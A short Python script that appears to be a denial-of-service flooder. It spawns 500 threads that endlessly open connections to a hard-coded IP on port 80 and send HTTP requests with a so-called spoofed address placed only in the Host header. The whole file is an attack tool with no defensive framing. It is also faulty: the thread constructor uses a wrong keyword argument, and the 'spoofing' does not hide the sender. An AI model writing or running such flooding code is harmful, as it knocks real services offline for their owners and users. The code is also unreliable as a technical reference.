import threading
import socket

target_ip_address = '172.24.124.199'
port = 80
spoof_ip_address = '100.64.100.10'
current_connections = 0

def ddos_attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip_address, port))
        s.sendto(("GET /" + target_ip_address + " HTTP/1.1\r\n").encode('ascii'), (target_ip_address, port))
        s.sendto(("Host: " + spoof_ip_address + "\r\n\r\n").encode('ascii'), (target_ip_address, port))
        s.close()

        global current_connections
        current_connections += 1

        if current_connections % 500 == 0:
            print(current_connections)

for i in range(500):
    thread = threading.Thread(target_ip_address=ddos_attack)
    thread.start()
